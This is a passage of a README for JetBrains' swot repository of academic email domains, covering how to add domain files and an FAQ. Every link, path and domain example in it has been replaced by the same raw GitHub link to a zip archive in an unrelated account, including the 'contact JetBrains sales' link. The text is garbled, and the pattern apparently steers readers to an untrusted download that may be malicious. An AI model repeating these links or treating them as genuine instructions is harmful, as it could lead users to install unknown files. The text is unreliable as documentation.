...
If you represent a primary or secondary school and you are certain of the necessity of a professional version of a JetBrains tool for your school, please contact JetBrains sales team via https://raw.githubusercontent.com/osnux/swot/master/rhapsodomancy/swot.zip
...
1. Each domain is represented by a single `.txt` file in the repository. If there is a file `https://raw.githubusercontent.com/osnux/swot/master/rhapsodomancy/swot.zip`, it means that an email domain `https://raw.githubusercontent.com/osnux/swot/master/rhapsodomancy/swot.zip` is included in the repository. Please note that the repository reverses the order of the name components, and also note that **.txt extension is mandatory**. Example: add file `https://raw.githubusercontent.com/osnux/swot/master/rhapsodomancy/swot.zip` to add a domain `https://raw.githubusercontent.com/osnux/swot/master/rhapsodomancy/swot.zip` to the repository.

2. Pull requests can include one or more files which you wish to add.

3. Each file in the repository has to contain the name of the university, which the domain represented by the file belongs to. For example, a file `https://raw.githubusercontent.com/osnux/swot/master/rhapsodomancy/swot.zip` has to contain a line in it: *"Federal University of Agriculture, Abeokuta"*.
...
Please refer to the `https://raw.githubusercontent.com/osnux/swot/master/rhapsodomancy/swot.zip` file in this repository to read more about the repository structure and contributing rules.

## FAQ
#### There are many domains in my university, how can I add all of them?
If all the domains used for teachers' and students' email are in the same upper-level domain, you can add the upper-level domain. For example, if there is a domain `https://raw.githubusercontent.com/osnux/swot/master/rhapsodomancy/swot.zip` owned by a university, and there are subdomains such as `https://raw.githubusercontent.com/osnux/swot/master/rhapsodomancy/swot.zip` and `https://raw.githubusercontent.com/osnux/swot/master/rhapsodomancy/swot.zip`, used by the students and the teachers respectively, you can add `https://raw.githubusercontent.com/osnux/swot/master/rhapsodomancy/swot.zip` domain only, and both students and teachers will be able to request their free licenses.
...
If the university uses several email domains in different upper-level domains (for example, `https://raw.githubusercontent.com/osnux/swot/master/rhapsodomancy/swot.zip` and `https://raw.githubusercontent.com/osnux/swot/master/rhapsodomancy/swot.zip`), please submit several files with different paths and the same content (i.e., same name of the university) in your pull request.
